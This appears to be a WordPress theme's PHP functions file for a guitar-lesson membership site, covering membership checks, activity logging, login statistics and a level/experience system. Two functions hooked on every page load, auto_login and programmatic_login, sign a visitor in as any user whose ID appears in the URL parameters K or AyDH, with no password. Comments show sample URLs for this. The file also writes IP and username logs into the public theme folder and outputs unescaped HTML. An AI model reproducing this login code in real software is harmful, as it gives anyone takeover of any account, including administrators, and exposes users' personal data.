<?php
/**
 *
 *	Check if user is guitar god
 *
 *	@param $user_id (defaults to current user id)
 *	@return True / False
 * 	true if the user has an active membership.
 * 	false if the user has no membership at all or has an expired/cancelled/pending membership.
 *
 */
function dg_is_user_guitar_god( $user_id = NULL ) {

	if ( $user_id == NULL ) {

		$user_id = get_current_user_id();

	}

	$result = rcp_user_has_active_membership( $user_id );

	return $result;

}

/**
 *
 *	Check if user is guitar god
 *
 *	@param $string the thing i'm checking access of, e.g. 'exercises'
 *	@param $user_id user id to check, default to current user
 *	@return True / False
 * 	true if the user has an active membership.
 * 	false if the user has no membership at all or has an expired/cancelled/pending membership.
 *
 */
function dg_has_user_bought( $string, $user_id = null ) {

	if ( $user_id == null ) {

		$user_id = get_current_user_id();

		if ( $user_id == 0 ) {

			return FALSE;

		}

		$current_user = get_user_by( 'ID', $user_id );

	}

	if ( $string == 'exercises' ) {

		$product_id = 24471;

	}

	if ( wc_customer_bought_product( $current_user->user_email, $current_user->ID, $product_id ) ) {

		return TRUE;

	} else {

		return FALSE;

	}

}

/*
**	Random Functions
*/
// home made debug function
function dg_debug($content = '') {

	$filename = get_stylesheet_directory().'/debug.txt';
	$IPAddress = $_SERVER['REMOTE_ADDR'];
	$current_user = wp_get_current_user();
	$username = '';

	if ( $current_user->ID == 0  ) {

		$username = 'Guest';

	} else {

		$username = $current_user->user_login;

	}

	$output = date('D, d M Y H:i:s') . ' - [IP: '. $IPAddress .'] - [User: '. $username .'] - ' . $content . PHP_EOL;

	file_put_contents($filename, $output, FILE_APPEND);

}

/*
**
**		Track user activity and print to csv file
**
*/
function dg_activity($content, $category, $user_id = 0) {

	$filename 		= get_stylesheet_directory().'/activity.csv';
	$IPAddress 		= $_SERVER['REMOTE_ADDR'];
	$username 		= '';
	$data 			= array();
	$aedt_time		= time() + (60 * 60 * 11);

	if ($user_id == 0) {

		$current_user 	= wp_get_current_user();
		$user_id  		= $current_user->ID;

	}

	if ( $user_id == 0  ) {

		$username = 'Guest';

	} else {

		$username = $current_user->user_login;

	}

	// Cancel if this is admin account
	if ($username == 'christopher') {

		return;

	}
	
	if ( ! file_exists($filename) ) {

		// if file doesn't exist add headers
		$data[0] = array('Date (AEDT)', 'IP Address', 'User ID', 'Category', 'Activity',);
		$data[1] = array( date('D - d M Y H:i:s', $aedt_time), $IPAddress, $username, $category, $content, );

	} else {

		// Else append new data
		$data[0] = array( date('D - d M Y H:i:s', $aedt_time), $IPAddress, $username, $category, $content );		

	}

	// a for append
	$file = fopen($filename, "a+");
	 
	// save each row of the data
	foreach ($data as $row) {
		
		fputcsv($file, $row);

	}
	 
	// Close the file
	fclose($file);

}

//Check if the page has children
function dg_check_if_page_has_children($post_id) {

    $children = get_pages('child_of='.$post_id);

    if ( count( $children ) > 0 ) {

        $parent = true;

    } else {
    	
    	$parent = false;
    }

    return $parent;
}

// return array of child id's
function child_page_ids($id) {

	$args = array(
		'post_parent' => $id,
		'post_type'   => 'any', 
		'numberposts' => -1,
		'post_status' => 'any'
	);

	$children = get_children( $args );

	foreach ( $children as $child ) {

		$child_ids[] = $child->ID;

	}
}

// tooltip function
function hover_tip($string) {

	echo '<i class="fa fa-question-circle tips" aria-hidden="true" data-title="'.$string.'" data-original-title="" title=""></i>';

}

// Create function for manipulating bytes
function formatSizeUnits($bytes) {
	
    if ($bytes >= 1073741824)
    {
        $bytes = number_format($bytes / 1073741824, 2) . ' GB';
    }
    elseif ($bytes >= 1048576)
    {
        $bytes = number_format($bytes / 1048576, 2) . ' MB';
    }
    elseif ($bytes >= 1024)
    {
        $bytes = number_format($bytes / 1024, 2) . ' KB';
    }
    elseif ($bytes > 1)
    {
        $bytes = $bytes . ' bytes';
    }
    elseif ($bytes == 1)
    {
        $bytes = $bytes . ' byte';
    }
    else
    {
        $bytes = '0 bytes';
    }

    return $bytes;
}
// Check listing
function is_merchant_listing() {

	global $post;
	$author = $post->post_author;

	// Return false if author id = 2 (christopher)
	if ($author == '2') {
		return false;
	}

	//Check if they have the ability to sell
	if ( user_can($author, 'seller') ) {
		return true;
	} else {
		return false;
	}

}

// Dump user activity
function dg_check_user_stats($user = null) {

	if ($user == null) {
		$user = wp_get_current_user();
	} 

	// Load vars
    global $wpdb;
	$table = 'wp_fa_user_logins';
	$i = 0;

	// SQL statement as from plugin
    $sql = " SELECT"
            . " FaUserLogin.*, "
            . " UserMeta.meta_value, TIMESTAMPDIFF(SECOND,FaUserLogin.time_login,FaUserLogin.time_last_seen) as duration"
            . " FROM " . $table . "  AS FaUserLogin"
            . " LEFT JOIN $wpdb->usermeta AS UserMeta ON ( UserMeta.user_id=FaUserLogin.user_id"
            . " AND UserMeta.meta_key LIKE '" . $wpdb->prefix . "capabilities' )"
            . " WHERE 1 ";

    // Restrict by User ID (current user)
    $field = 'user_id';
	$user_id 	= $user->ID;
   	$where_query .= " AND `FaUserLogin`.`$field` = '" . $user_id . "' ";
    $sql .= $where_query;

    // Order by most recent
    $sql .= ' ORDER BY FaUserLogin.time_login DESC';

    // Store results
    $results = $wpdb->get_results($sql, 'ARRAY_A');

    // Log errors
    if ("" != $wpdb->last_error) {
        Faulh_Error_Handler::error_log("last error:" . $wpdb->last_error . " last query:" . $wpdb->last_query, __LINE__, __FILE__);
    }

	$totalDuration 		= 0;
	$maxDuration 		= 0;
	$lastSeen 			= $results[0]['time_last_seen'];
    $lastSeen 			=  time() - strtotime($lastSeen);

	// Loop through results
    foreach($results as $result) {

    	// Create vars
    	$i++;
    	// $last_seen 				= human_time_diff($time_last_seen_unix);
    	$totalDuration 			+= $result['duration'];

    	// calculate max
    	if ($maxDuration < $result['duration']) {
    		$maxDuration = $result['duration'];
    	}
    }

    $lastSeenClean 			= secondsToWords($lastSeen);
    $maxDurationClean 		= secondsToWords($maxDuration);
    $totalDurationClean 	= secondsToWords($totalDuration);


	/*

		@param Start displaying results
		
	*/

	$results = array(
		'last_seen_raw' 			=> $lastSeen,
		'longest_duration_raw' 		=> $maxDuration,
		'total_duration_raw' 		=> $totalDuration,
		'last_seen_human' 			=> $lastSeenClean,
		'longest_duration_human' 	=> $maxDurationClean,
		'total_duration_human' 		=> $totalDurationClean,
		'total_number_sessions' 	=> $i,
		'current' 					=> time(),
		'last_seen_date' 			=> $results[0]['time_last_seen']
	);

	return $results;

}

// Dump user activity
// I want every session, the date, time spent in that session
function dg_check_user_stats_return_each_session($user = null) {

	if ($user == null) {
		$user = wp_get_current_user();
	} 

	// Load vars
    global $wpdb;
	$table = 'wp_fa_user_logins';
	$results = array();
	$i = 0;

	// SQL statement as from plugin
    $sql = " SELECT"
            . " FaUserLogin.*, "
            . " UserMeta.meta_value, TIMESTAMPDIFF(SECOND,FaUserLogin.time_login,FaUserLogin.time_last_seen) as duration"
            . " FROM " . $table . "  AS FaUserLogin"
            . " LEFT JOIN $wpdb->usermeta AS UserMeta ON ( UserMeta.user_id=FaUserLogin.user_id"
            . " AND UserMeta.meta_key LIKE '" . $wpdb->prefix . "capabilities' )"
            . " WHERE 1 ";

    // Restrict by User ID (current user)
    $field = 'user_id';
	$user_id 	= $user->ID;
   	$where_query .= " AND `FaUserLogin`.`$field` = '" . $user_id . "' ";
    $sql .= $where_query;

    // Order by most recent
    $sql .= ' ORDER BY FaUserLogin.time_login DESC';

    // Store results
    $db_results = $wpdb->get_results($sql, 'ARRAY_A');

    // Log errors
    if ("" != $wpdb->last_error) {
        Faulh_Error_Handler::error_log("last error:" . $wpdb->last_error . " last query:" . $wpdb->last_query, __LINE__, __FILE__);
    }

	// Loop through results
    foreach($db_results as $result) {

    	$results[$i]['date'] 		= $result['time_login'];
    	$results[$i]['duration'] 	= $result['duration'];

    	// Array index
    	$i++;

    }

	return $results;

}

function secondsToWords($seconds) {

	if ($seconds < 60 ) {
		return '<span class="time title-h2">'.$seconds . '</span><span class="time-unit"> seconds</span>';
	}

    $days = intval(intval($seconds) / (3600*24));
    $hours = (intval($seconds) / 3600) % 24;
    $minutes = (intval($seconds) / 60) % 60;
    $seconds = intval($seconds) % 60;

    $days = $days ? '<span class="time title-h3">'.$days . '</span><span class="time-unit"> days</span>' : '';
    $hours = $hours ? '<span class="time title-h3">'.$hours . '</span><span class="time-unit"> hours</span>' : '';
    $minutes = $minutes ? '<span class="time title-h3">'.$minutes . '</span><span class="time-unit"> minutes</span>' : '';
    $seconds = $seconds ? '<span class="time title-h3">'.$seconds . '</span><span class="time-unit"> seconds</span>' : '';

    return $days . ' ' . $hours . ' ' . $minutes;
}

// Pagination template
// add_action('woocommerce_after_shop_loop', 'chris_pagination', 20);
//remove_action( 'woocommerce_after_shop_loop', 'woocommerce_pagination', 10 );
function chris_pagination($query) {
    $currentPage = get_query_var( 'paged' ) ? get_query_var( 'paged' ) : 1;
    ?>
	<div class="found-results">
		<div class="sf-results-found-no">
			<div class="nav-previous">
				<?php previous_posts_link( '<span class="previous-icon"></span>' ); ?>
			</div>
			<span>Found <?php echo $query->found_posts; ?> Results</span>
		</div>
		<div class="sf-results-page-no">
			<span>Page <?php echo $currentPage; ?> of <?php echo $query->max_num_pages; ?></span>
			<div class="nav-next">
				<?php next_posts_link( '<span class="next-icon"></span>', $query->max_num_pages ); ?>
			</div>
		</div>
	</div>
	<?php

}

function dg_return_array_last_x_days($days, $format) {

	$today     = new DateTime(); // today
	$begin     = $today->sub(new DateInterval('P'.$days.'D')); //created 30 days interval back
	$end       = new DateTime();
	$end       = $end->modify('+1 day'); // interval generates upto last day
	$interval  = new DateInterval('P1D'); // 1d interval range
	$daterange = new DatePeriod($begin, $interval, $end); // it always runs forwards in date
	foreach ($daterange as $date) { // date object

	    $d[] = $date->format($format); // your date

	}
	// array_reverse($d);
	return $d;
}


function dg_check_total_tab_analytic_stats($user_id = null) {

	// Silence is golden
	if ($user_id == null) {
		$user_id = get_current_user_id();
	}

    $meta_key       = 'dg_track_guitar_exercises';
    $tab_analytics  = get_user_meta( $user_id, $meta_key, FALSE )[0];
    $results 		= array();

    if (isset($tab_analytics) && ! empty($tab_analytics)) {
	    foreach($tab_analytics as $tab) {

	    	$tab_plays      = $tab['play']['count'];
	        $tab_pause      = $tab['pause']['count'];
	        $tab_finished   = $tab['finished']['count'];

	        $results['plays'] += $tab_plays;
	        $results['pause'] += $tab_pause;
	        $results['finish'] += $tab_finished;

	    }
    } else {

        $results['plays'] = 0;
        $results['pause'] = 0;
        $results['finish'] = 0;

    }


    return $results;

}

/**
 * Check if the given user agent string is one of a crawler, spider, or bot.
 *
 * @param string $user_agent
 *   A user agent string (e.g. Googlebot/2.1 (+http://www.google.com/bot.html))
 *
 * @return bool
 *   TRUE if the user agent is a bot, FALSE if not.
 */
function dg_bot_check() {

	if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider|mediapartners/i', $_SERVER['HTTP_USER_AGENT'])) {
		
		return TRUE;

	} else {
		
		return FALSE;

	}

/*  // User lowercase string for comparison.
  $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

  // A list of some common words used only for bots and crawlers.
  $bot_identifiers = array(
    'bot',
    'slurp',
    'crawler',
    'spider',
    'curl',
    'facebook',
    'fetch',
  );

  // See if one of the identifiers is in the UA string.
  foreach ($bot_identifiers as $identifier) {

    if (strpos($user_agent, $identifier) !== FALSE) {

      return TRUE;

    }

  }

  return FALSE;*/

}

/*
**
**	@ Description: Follows level/exp curve of rs.
**	@ Any points earned should be calculated as roughly 5000 hours (300,000 minutes) to get to 99
**	@ 99 = 13,034,431
**	@ E.g. if one exercise takes 5 minutes, it would take 60,000 times to get to 99, which would be 217 exp each
*/
function dg_calculate_experience($user_id = null) {

	if ($user_id == null) {
    	$user_id = get_current_user_id();
	}
	$user = get_user_by('id', $user_id);

	// Store Vars
	$stats 				= dg_check_user_stats($user);
	$tab_stats 			= dg_check_total_tab_analytic_stats($user_id);
	$exp 				= array();
	$results 			= array();
	$total_experience 	= 0;

	// Created Account = 500
	$exp['created-account'] 	= 1 * 500;

	// Logged in = 25
	$exp['logged-in'] 			= $stats['total_number_sessions'] * 25;

	// Time spent online = 1 p/s
	$exp['seconds-online'] 		= $stats['total_duration_raw'] * .5;

	// Tab Plays
	$exp['tab-play'] 			= $tab_stats['plays'] * 50;

	// Tab Finished
	$exp['tab-finish'] 			= $tab_stats['finish'] * 250;

	// Fill in account details

	// Make friends

	// Post in forums

	// Upload content

	// Sum of
	foreach($exp as $key => $value) {

		$total_experience += $value;

	}

	// Process level data
	$calculate_level 				= dg_calculate_level($total_experience);

	// Build array
	$results['total_experience'] 			= $total_experience;
	$results['level'] 						= $calculate_level['level'];
	$results['exp_to_next_level'] 			= $calculate_level['exp_to_next_level'];
	$results['total_exp_to_next_level'] 	= $calculate_level['next_level_total_amount_needed'];
	$results['next_level']		 			= $calculate_level['next_level'];
	$results['data'] 						= $exp;

	// Return Results
	return $results;

}

function dg_calculate_level($experience) {

	$level = 0;
	$results = array();

	$level_experience_array = array(
		0,
		83,
		174,
		276,
		388,
		512,
		650,
		801,
		969,
		1154,
		1358,
		1584,
		1833,
		2107,
		2411,
		2746,
		3115,
		3523,
		3973,
		4470,
		5018,
		5624,
		6291,
		7028,
		7842,
		8740,
		9730,
		10824,
		12031,
		13363,
		16456,
		18247,
		20224,
		22406,
		24815,
		27473,
		30408,
		33648,
		37224,
		41171,
		45529,
		50339,
		55649,
		61512,
		67983,
		75127,
		83014,
		91721,
		101333,
		111945,
		123660,
		136594,
		150872,
		166636,
		184040,
		203254,
		224466,
		247886,
		273742,
		302288,
		333804,
		368599,
		407015,
		449428,
		496254,
		547953,
		605032,
		668051,
		737627,
		814445,
		899257,
		992895,
		1096278,
		1210421,
		1336443,
		1475581,
		1629200,
		1798808,
		1986068,
		2192818,
		2421087,
		2673114,
		2951373,
		3258594,
		3597792,
		3972294,
		4385776,
		4842295,
		5346332,
		5902831,
		6517253,
		7195629,
		7944614,
		8771558,
		9684577,
		10692629,
		11805606,
		13034431
	);

	foreach($level_experience_array as $level_experience) {

		if ( $experience > $level_experience) {

			$level++;
			continue;

		} else {

			$next_level = $level_experience - $experience;
			$next_level_total_amount_needed = $level_experience;

			break;

		}

	}

	$results['level'] 							= $level;
	$results['exp_to_next_level'] 				= $next_level;
	$results['next_level_total_amount_needed'] 	= $next_level_total_amount_needed;
	$results['next_level'] 						= $level + 1;

	return $results;

}

function dg_get_all_exercise_data($user_id = null) {

	if ($user_id == null) {
    	$user_id = get_current_user_id();
	}

    $meta_key       = 'dg_track_guitar_exercises';
    $tab_analytics  = get_user_meta( $user_id, $meta_key, FALSE )[0];
    $args 			= array('child_of' => 23097, 'sort_column' => 'menu_order');
    $exercise_pages = get_pages($args);
    $results 		= array();

    foreach($exercise_pages as $exercise) {

    	$post_id 		= $exercise->ID;

    	$has_children 	= dg_check_if_page_has_children($post_id);

    	if ($has_children == true ) {

    		continue;

    	}

    	$title 			= get_the_title( $post_id );
        $url 			= get_permalink( $post_id );
    	$tab_plays      = 0;
        $tab_pause      = 0;
        $tab_finished   = 0;

        foreach ($tab_analytics as $tab) {

	        $tab_id  = $tab['id'];

	        if ($post_id == $tab_id) {

	        	$tab_plays      = $tab['play']['count'];
		        $tab_pause      = $tab['pause']['count'];
		        $tab_finished   = $tab['finished']['count'];

		        $results[$tab_id]['play'] 	= $tab_plays;
		        $results[$tab_id]['pause'] 	= $tab_pause;
		        $results[$tab_id]['finish'] = $tab_finished;

		        break;

	        }

    	}


    }

    return $results;
}

function dg_get_exercise_pages() {

	$result = get_pages( array( 'child_of' => 23097 ) );

	foreach($result as $r) {

		$page_ids[] = $r->ID;
		
	}

	return $page_ids;

}

/**
 *
 *
 *	Log someone in wit query parameters
 *	@param $user_id
 *	@return Logs the person in
 *
 **/
add_action('init', 'auto_login');
function auto_login() {

	if ( is_user_logged_in() ) {

		return;

	} else {

		if ( isset($_GET['K']) ) {

			$user_id = $_GET['K'];

			$user = get_userdata( $user_id );

			if ( $user == false || $user = null) {

				// Couldnt find user

			} else {

				$user = get_user_by('ID', $user_id);

				clean_user_cache($user->ID);

				wp_clear_auth_cookie();

				wp_set_current_user($user_id);

				wp_set_auth_cookie($user_id);

				update_user_caches($user);

			}

		} else {

			return;
			// echo 'Didnt find GET';

		}
	}
}

// https://daviesguitars.io/checkout/?add-to-cart=24471&K=180

/**
 * Programmatically logs a user in
 * 
 * @param string $username
 * @return bool True if the login was successful; false if it wasn't
 */

// https://daviesguitars.io/checkout/?add-to-cart=24471&AyDH=180

add_action( 'init', 'programmatic_login' );
function programmatic_login() {

    if ( is_user_logged_in() || is_admin() ) {

        return false;

    }

    if ( isset($_GET['AyDH']) ) {

    	$temp_user_id = $_GET['AyDH'];

    	if ( wp_validate_auth_cookie() == $temp_user_id ) {

    		return false;

    	}

    	$temp_user = get_user_by( 'ID', $temp_user_id );

    	if ($temp_user == false || $temp_user == null) {

    		return false;

    	}

        $temp_username = $temp_user->user_login;

        add_filter( 'authenticate', 'allow_programmatic_login', 10, 3 );    
        // hook in earlier than other callbacks to short-circuit them

	    $user = wp_signon( array( 'user_login' => $temp_username ) );

	    remove_filter( 'authenticate', 'allow_programmatic_login', 10, 3 );

	    if ( is_a( $user, 'WP_User' ) ) {

	        wp_set_current_user( $user->ID, $user->user_login );

	        if ( is_user_logged_in() ) {

	            return true;

	        }

	    }

	    return false;

    }

    return false;

 }

 /**
  * An 'authenticate' filter callback that authenticates the user using only     the username.
  *
  * To avoid potential security vulnerabilities, this should only be used in     the context of a programmatic login,
  * and unhooked immediately after it fires.
  * 
  * @param WP_User $user
  * @param string $username
  * @param string $password
  * @return bool|WP_User a WP_User object if the username matched an existing user, or false if it didn't
  */
add_filter( 'wc_session_use_secure_cookie', '__return_true' );
function allow_programmatic_login( $user, $username, $password ) {

	return get_user_by( 'login', $username );

}

/**
 *
 *	Detect user location
 *	@return flag (<img> tag), country, state
 *
 */
function dg_get_user_country( $user_id = NULL, $size = 32, $style = 'shiny' ) {

	// Default
	if ( $user_id == NULL ) {

		$user_id = get_current_user_id();

	}

	$sessions = get_user_meta( $user_id, 'session_tokens', TRUE );

	foreach( $sessions as $session ) {

		$ip_address = $session['ip'];

	}

	$location = WC_Geolocation::geolocate_ip($ip_address);
	$location['flag'] = '<img src="https://www.countryflags.io/'.$location['country'].'/'.$style.'/'.$size.'.png">';
	return $location;

}